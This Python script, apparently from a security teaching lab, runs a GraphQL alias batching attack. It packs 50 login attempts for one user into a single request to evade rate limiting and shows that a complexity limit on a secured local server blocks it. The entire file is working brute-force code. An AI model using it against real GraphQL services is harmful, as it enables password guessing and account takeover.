"""
Alias / Batching Attack — "The Machine Gun"
============================================
Packs 50 login attempts into ONE HTTP request using GraphQL aliases.
To rate-limiting middleware this looks like 1 request — but the server
runs 50 individual login mutations internally.
The correct password (password123) is included in the batch.

Run against VULNERABLE server:  SECURE_MODE=false  → all 50 attempts run, correct one succeeds
Run against SECURED   server:   SECURE_MODE=true   → entire request rejected (complexity > 100)
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE = "http://localhost:5001"

# Build 50 aliased login attempts — one of them has the real password
PASSWORD_LIST = [f"wrongpass{i}" for i in range(1, 49)] + ["password123", "wrongpass50"]


def build_batched_mutation(username: str, passwords: list) -> str:
    aliases = "\n  ".join(
        f'attempt{i+1}: login(username: "{username}", password: "{pwd}") '
        f'{{ token userId message }}'
        for i, pwd in enumerate(passwords)
    )
    return f"mutation BatchedLogin {{\n  {aliases}\n}}"


def run_attack(label: str):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  ALIAS / BATCHING ATTACK  [{label}]")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"Packing {len(PASSWORD_LIST)} login attempts into ONE HTTP request ...")
    print(f"Target user: alice  |  Correct password hidden at attempt #49\n")

    query = build_batched_mutation("alice", PASSWORD_LIST)

    r = requests.post(
        f"{BASE}/graphql",
        json={"query": query},
        timeout=30,
    )

    print(f"  HTTP status: {r.status_code}")

    if r.status_code == 400:
        err = r.json().get("errors", [{}])[0].get("message", "")
        print(f"\n{Fore.GREEN}[RESULT] ATTACK BLOCKED — entire batch rejected{Style.RESET_ALL}")
        print(f"  Server message: {err}")
        return

    data = r.json()
    if "errors" in data and not data.get("data"):
        print(f"\n{Fore.GREEN}[RESULT] ATTACK BLOCKED — errors returned{Style.RESET_ALL}")
        print(f"  {data['errors'][0]['message']}")
        return

    results = data.get("data", {})
    found = None
    for alias, result in results.items():
        if result and result.get("token"):
            found = (alias, result)
            break

    print(f"\n  {len(results)} attempts processed in a single HTTP request")
    if found:
        print(f"\n{Fore.RED}[RESULT] ATTACK SUCCEEDED — password cracked!{Style.RESET_ALL}")
        print(f"  Winning alias : {found[0]}")
        attempt_num = int(found[0].replace("attempt", ""))
        print(f"  Password used : {PASSWORD_LIST[attempt_num - 1]}")
        print(f"  Token received: {found[1]['token'][:40]}...")
    else:
        print(f"\n{Fore.YELLOW}[RESULT] Batch accepted but no valid login found in this run.{Style.RESET_ALL}")


if __name__ == "__main__":
    run_attack("live server")
